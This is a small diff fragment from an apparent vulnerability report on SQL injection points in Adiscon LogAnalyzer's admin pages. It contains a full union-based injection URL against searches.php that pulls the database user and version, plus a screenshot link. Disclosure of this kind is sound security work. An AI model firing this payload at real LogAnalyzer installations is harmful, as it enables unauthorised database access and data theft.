@@ -17,6 +17,7 @@ We found three SQL Injection point
 /admin/groups.php (need admin)
 
 screen of SQL injection
+
 http://{ip}/loganalyzer/admin/searches.php?op=edit&id=-8%20union%20all%20select%201,user(),@@version,4,5--
 ![image](https://github.com/costacoco/Adiscon/assets/48556345/930ac46a-e88f-4366-8ee9-54a2a9d95bbc)
 
